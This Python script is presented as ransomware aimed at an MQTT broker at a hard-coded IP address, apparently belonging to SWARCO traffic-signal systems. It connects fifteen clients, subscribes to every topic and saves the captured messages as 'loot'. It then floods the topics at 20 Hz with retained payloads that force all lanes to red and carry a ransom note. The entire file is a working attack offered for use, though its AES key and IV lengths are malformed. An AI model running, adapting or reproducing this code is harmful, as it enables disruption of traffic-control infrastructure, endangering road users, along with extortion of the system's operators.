#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.9 | NO TOR PROBLEMS | DIRECT ATTACK

import paho.mqtt.client as mqtt
import json, time, threading, os, random, base64, socket
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    os.system("pip install cryptography")
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.btc_addr = "fucknomoneySUCCHIALO"
        
        # 🔐 AES-256
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!X'
        self.aes_iv = b'SWARCO_SEMAFORI_16BYTES'
        
        self.clients = []
        self.attack_running = True
        print("🚀 NO TOR - DIRECT ATTACK!")
    
    def aes_encrypt(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.aes_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padding_len = 16 - (len(data.encode()) % 16)
        padded = data.encode() + bytes([padding_len] * padding_len)
        ct = encryptor.update(padded) + encryptor.finalize()
        return base64.b64encode(ct).decode()
    
    def force_red_payload(self):
        return json.dumps({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "TRUSTEDF57": "BLOCK_ACTIVE",
            "BTC": self.btc_addr,
            "lanes": ["1","2","3","10","15","16"],
            "status": "FORCE_RED_ALL"
        })
    
    def ransom_aes(self):
        note = f"TRUSTEDF57_RANSOM\nBTC:{self.btc_addr}\nKEY:{self.aes_key.hex()}\nROUTES:HALTED"
        return self.aes_encrypt(note)
    
    def on_connect(self, client, userdata, flags, rc):
        print(f"✅ CONNECT {client._client_id} rc={rc}")
        if rc == 0:
            client.subscribe("#")
    
    def on_message(self, client, userdata, msg):
        data = msg.payload.decode(errors='ignore')
        print(f"💾 {msg.topic}: {data[:40]}...")
        
        loot = self.aes_encrypt(f"{msg.topic}|{data}")
        try:
            with open("swarco_final.aes", "ab") as f:
                f.write(f"{loot}\n".encode())
        except:
            pass
    
    def create_direct_client(self, id):
        """🔥 CLIENT DIRETTO NO SOCKS"""
        client = mqtt.Client(f"FINAL_{id}")
        client.on_connect = self.on_connect
        client.on_message = self.on_message
        
        try:
            # PROVA DIRETTA
            client.connect(self.target_ip, self.port, 30)
            client.loop_start()
            print(f"✅ DIRECT {id}")
            return client
        except Exception as e:
            print(f"❌ Direct {id}: {e}")
            return None
    
    def attack_spam(self):
        """⚡ 20Hz SPAM"""
        payloads = [
            self.force_red_payload(),
            self.ransom_aes(),
            '{"NUCLEAR":"TRUSTEDF57","BTC":"' + self.btc_addr + '"}',
            '{"FORCE_RED":true,"ALL_LANES":true}'
        ]
        
        while self.attack_running:
            for client in self.clients[:]:
                if client:
                    topic = random.choice(["traffic-triggers-output", "traffic-statistic-output/#"])
                    payload = random.choice(payloads)
                    try:
                        client.publish(topic, payload, qos=2, retain=True)
                    except:
                        pass
            time.sleep(0.05)  # 20Hz!
    
    def run(self):
        print("💣 TRUSTEDF57 v2.9-DIRECT | NO SOCKS | AES FULL")
        os.system("rm -f swarco_final.aes")
        
        # 15 CLIENTS DIRETTI
        for i in range(15):
            client = self.create_direct_client(i)
            if client:
                self.clients.append(client)
            time.sleep(0.2)
        
        print("🚀 DIRECT ATTACK START - 15 CLIENTS!")
        
        spam_thread = threading.Thread(target=self.attack_spam)
        spam_thread.start()
        
        try:
            while True:
                time.sleep(10)
                loot_mb = os.path.getsize("swarco_final.aes") / 1024 / 1024
                print(f"📊 Clients:{len(self.clients)} | Loot:{loot_mb:.2f}MB")
        except KeyboardInterrupt:
            print("🛑 STOP")

if __name__ == "__main__":
    rw = SWARCORansomware()
    rw.run()
